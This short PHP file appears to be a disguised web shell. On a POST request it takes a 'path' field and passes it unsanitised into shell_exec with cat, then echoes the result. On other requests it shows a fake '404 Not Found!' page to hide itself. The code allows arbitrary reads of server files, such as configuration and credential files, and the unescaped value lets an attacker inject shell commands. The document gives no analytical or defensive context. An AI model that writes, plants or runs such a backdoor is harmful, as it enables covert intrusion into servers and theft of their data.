<?php
if($_POST){
$path = $_POST["path"] ;
   $text = shell_exec('cat "' . $path . '"');
   echo "" . $text . "";
   }
else{
echo '404 Not Found!';
}
?>